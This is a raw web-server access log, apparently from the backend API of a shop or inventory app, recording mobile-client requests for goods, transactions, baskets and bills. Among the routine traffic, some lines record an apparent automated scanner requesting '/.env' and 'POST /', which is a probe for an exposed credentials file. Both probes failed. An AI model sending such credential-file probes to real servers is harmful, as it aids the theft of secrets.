::ffff:127.0.0.1 - - [31/Aug/2022:01:30:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:30:16 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:30:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:30:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:30:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:30:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:04 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:31:22 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:31:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:05 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:05 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 200 463 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:05 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 200 2065 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:15 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:15 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:15 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:51 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:32:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 464 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:32:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 464 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:09 +0000] "DELETE /api/v1/transactions/630eba43f66eb6d6a87204c1 HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:24 +0000] "POST /api/v1/transactions HTTP/1.0" 200 254 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 464 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 464 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:41 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 396 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:44 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:44 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3407 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:47 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:33:49 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 1656 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:33:57 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 4583 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:34:03 +0000] "GET /api/v1/goods/user HTTP/1.0" 200 2493 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:34:07 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 3864 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:34:09 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:34:24 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:34:30 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:34:37 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:34:46 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:34:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:34:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:09 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:09 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 200 463 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:09 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 200 2530 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:46 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 200 2263 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:47 +0000] "GET /upload/no-photo.jpg HTTP/1.0" 404 158 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:56 +0000] "GET /upload/no-photo.jpg HTTP/1.0" 404 158 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:35:57 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:35:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:32 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:34 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:35 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:36 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:36 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:47 +0000] "GET /api/v1/goods/user?limit=100&select=quantity%20price%20photo%20name HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:47 +0000] "GET /upload/no-photo.jpg HTTP/1.0" 404 158 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:48 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:48 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:36:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:36:54 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:00 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:00 +0000] "GET /api/v1/goods/62f8a7d38e470b4b6899bd72 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:00 +0000] "GET /api/v1/transactions/user?good=62f8a7d38e470b4b6899bd72&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:00 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:04 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:04 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:06 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:06 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:23 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:37:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:37:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:38:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:38:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:38:43 +0000] "GET /api/v1/goods/user?barCode=8801166050906 HTTP/1.0" 200 132 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:39:09 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:39:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:39:09 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:40:55 +0000] "POST /api/v1/goods HTTP/1.0" 200 379 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:40:55 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:40:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3875 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:40:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 443 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:44:33 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:01:44:33 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:00 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 316 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:00 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:25 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3883 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:32 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:34 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:38 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:38 +0000] "GET /api/v1/goods/630ebc27f66eb6d6a87205e7 HTTP/1.0" 200 441 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:38 +0000] "GET /api/v1/transactions/user?good=630ebc27f66eb6d6a87205e7&sort=-createdAt HTTP/1.0" 200 565 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:38 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:47 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:45:47 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:45:47 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:47:44 +0000] "POST /api/v1/goods HTTP/1.0" 200 372 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:47:45 +0000] "POST /api/v1/transactions HTTP/1.0" 200 257 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:47:45 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4359 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:47:45 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 436 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:23 +0000] "POST /api/v1/bills/receipt HTTP/1.0" 200 397 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:24 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/goods/630ebc27f66eb6d6a87205e7 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/transactions/user?good=630ebc27f66eb6d6a87205e7&sort=-createdAt HTTP/1.0" 200 565 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 4367 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:28 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:52:28 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 603 "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:52:36 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 1656 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:54:05 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:54:08 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:56:13 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:56:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:01:56:17 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:01:58:38 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [31/Aug/2022:02:04:37 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [31/Aug/2022:02:04:37 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [31/Aug/2022:02:05:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [31/Aug/2022:02:05:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
